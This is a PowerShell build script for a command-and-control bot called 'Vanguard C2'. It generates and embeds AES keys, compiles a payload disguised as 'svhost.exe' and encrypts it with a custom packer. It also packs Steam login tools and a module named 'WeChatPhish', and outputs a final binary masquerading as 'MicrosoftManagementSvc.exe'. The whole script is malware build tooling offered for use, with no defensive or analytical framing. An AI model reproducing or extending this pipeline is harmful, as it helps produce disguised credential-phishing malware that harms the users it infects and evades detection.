# Vanguard C2: Ultra-Optimized Monolithic Rebuild Script (V7.4)
$ErrorActionPreference = "Stop"

Write-Host "================================================" -ForegroundColor Cyan
Write-Host "   VANGUARD C2: ULTRA-OPTIMIZED BUILD (GZIP)    " -ForegroundColor Cyan
Write-Host "================================================" -ForegroundColor Cyan

# Configuration
$SessionKey = New-Object Byte[] 32
$MasterKey = New-Object Byte[] 32
$rng = [System.Security.Cryptography.RNGCryptoServiceProvider]::Create()
$rng.GetBytes($SessionKey)
$rng.GetBytes($MasterKey)

$SessionKeyB64 = [System.Convert]::ToBase64String($SessionKey)
$MasterKeyB64 = [System.Convert]::ToBase64String($MasterKey)

# Wrap SessionKey with MasterKey (AES-CBC, Zero IV) for Constants.cs
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Key = $MasterKey
$aes.IV = New-Object Byte[] 16
$aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
$aes.Padding = [System.Security.Cryptography.PaddingMode]::None
$encryptor = $aes.CreateEncryptor()
$encSessionKey = $encryptor.TransformFinalBlock($SessionKey, 0, $SessionKey.Length)
$EncryptedSessionKeyB64 = [System.Convert]::ToBase64String($encSessionKey)

Write-Host "[*] Patching Constants.cs with new synchronized keys..." -ForegroundColor Yellow
$constantsPath = "defense\Constants.cs"
$content = Get-Content $constantsPath -Raw
$content = $content -replace 'public const string MASTER_KEY_B64 = ".*?";', "public const string MASTER_KEY_B64 = `"$MasterKeyB64`";"
$content = $content -replace 'public const string ENCRYPTED_SESSION_KEY_B64 = ".*?";', "public const string ENCRYPTED_SESSION_KEY_B64 = `"$EncryptedSessionKeyB64`";"
Set-Content $constantsPath $content

Write-Host "[*] Phase 1: Nuclear Cleanup..." -ForegroundColor Yellow
Get-Process "svhost" -ErrorAction SilentlyContinue | Stop-Process -Force
Get-Process "MicrosoftManagementSvc" -ErrorAction SilentlyContinue | Stop-Process -Force
Remove-Item -Path "DiscordProSvc\bin", "DiscordProSvc\obj", "bin", "obj", "dist", "svhost.bin", "scripts\publish" -Recurse -Force -ErrorAction SilentlyContinue
if (!(Test-Path "dist")) { New-Item -ItemType Directory -Path "dist" | Out-Null }

Write-Host "[*] Phase 2: Building Resource Packer (Self-Contained)..." -ForegroundColor Cyan
dotnet publish scripts\ResourcePacker.csproj -c Release -r win-x64 --self-contained true -o scripts\publish --nologo
if ($LASTEXITCODE -ne 0) { throw "ResourcePacker Compilation FAILED!" }
$PackerExe = Join-Path (Get-Location).Path "scripts\publish\ResourcePacker.exe"

Write-Host "[*] Phase 3: Building Discord Pro Svc (NativeAOT)..." -ForegroundColor Cyan
dotnet publish DiscordProSvc\DiscordProSvc.csproj -c Release -r win-x64 -p:PublishAot=true --nologo
if ($LASTEXITCODE -ne 0) { throw "DiscordProSvc Build FAILED!" }

$SvcPath = "DiscordProSvc\bin\Release\net8.0-windows\win-x64\publish\DiscordProSvc.exe"
Copy-Item $SvcPath "dist\svhost.exe" -Force

Write-Host "[*] Phase 4: Compressing & Encrypting Resources..." -ForegroundColor Cyan
& $PackerExe "dist\svhost.exe" "svhost.bin" $SessionKeyB64

if (!(Test-Path "svhost.bin")) {
    throw "Critical Resource Error: svhost.bin was NOT created by the packer!"
}

# Pack other large resources if they exist
$OtherResources = @(
    @{ Src = "tools\SteamAlert.exe"; Dest = "SteamAlert.bin" },
    @{ Src = "tools\SteamLogin.exe"; Dest = "SteamLogin.bin" },
    @{ Src = "Modules\WeChat.exe";   Dest = "WeChatPhish.bin" }
)

foreach ($res in $OtherResources) {
    if (Test-Path $res.Src) {
        & $PackerExe $res.Src $res.Dest $SessionKeyB64
    }
}

Write-Host "[*] Phase 5: Final Monolithic AOT Build..." -ForegroundColor Cyan
dotnet publish FinalBot.csproj -c Release -r win-x64 -p:PublishAot=true --nologo
if ($LASTEXITCODE -ne 0) { throw "Core Engine Build FAILED!" }

$FinalExe = "bin\Release\net8.0-windows\win-x64\publish\MicrosoftManagementSvc.exe"
Write-Host "`n[SUCCESS] Ultra-Optimized build complete!" -ForegroundColor Green
Write-Host "[+] Binary: $FinalExe" -ForegroundColor White
$Size = (Get-Item $FinalExe).Length / 1MB
Write-Host "[+] Final Size: $('{0:N2}' -f $Size) MB" -ForegroundColor Yellow

# Final Cleanup
Remove-Item dist, scripts\publish -Recurse -Force -ErrorAction SilentlyContinue
